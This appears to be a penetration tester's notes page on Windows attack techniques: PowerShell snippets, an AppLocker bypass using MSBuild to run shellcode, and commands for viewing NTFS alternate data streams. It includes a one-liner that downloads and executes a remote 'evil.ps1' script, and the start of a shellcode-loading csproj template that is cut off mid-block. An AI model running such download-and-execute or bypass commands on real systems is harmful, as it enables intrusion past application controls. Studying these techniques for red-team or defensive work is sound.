## Windows Registry

## Powershell

Powershell was Windows' answer to improving the scripting solution within Windows.  It's incredibly powerful for both Sysadmins as well as attackers.  Here I will include a number of snippets I've found useful for attacking devices with.

#### Executing a script without an extension

```text
powershell - < ps1file
```

#### Executing a script hosted on a web-server

```text
iex (new-object net.webclient).downloadstring('http://192.168.0.1/evil.ps1')
```

## Applocker

> AppLocker advances the app control features and functionality of Software Restriction Policies. AppLocker contains new capabilities and extensions that allow you to create rules to allow or deny apps from running based on unique identities of files and to specify which users or groups can run those apps.

Source: [What Is AppLocker?](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)

Despite the power this gives the Administrator in locking down what users can and can't execute, there are a disturbing number of ways to bypass this.  [Ultimate Applocker Bypass List](https://github.com/api0cradle/UltimateAppLockerByPassList) aims to record most of them.

### MSBuild

We can use MSBuild to execute arbitrary shellcode. The Cn33liz [MSBuildShell ](https://github.com/Cn33liz/MSBuildShell)is one such example. To compile a `csproj` file we use:

```text
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe test.csproj
```

An example csproj file to include shellcode within is:

```markup
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->

## Alternate Data Streams

This is more a  feature of the NTFS file system than it is a Windows feature, but it's important to understand from both a red-team and blue-team perspective.  

These are also disturbingly common in CTF's through the security via obscurity, so we need some method of viewing and potentially executing these alternate data streams.  To list all alternate data streams 

```text
dir /R
```

### Powershell

```bash
Get-Content -path C:\Users\Booj\ads -stream *
```

We can also view individual streams using

```text
Get-Content -path C:\Users\Booj\ads -stream <streamname>
```

### Windows Pre-Vista

In Windows prior to Vista, there's unfortunately no easy way of viewing these streams in default Windows without a GUI access.  In an engagement this may not be entirely practical.

The best version, working on XP, I found to be [LADS](https://www.aldeid.com/wiki/LADS), but a number of the links online appear to be dead.  The [Web Archive](http://web.archive.org/web/20150602054446/http://www.heysoft.de/download/lads.zip) version is still up so acquiring a copy is still possible.
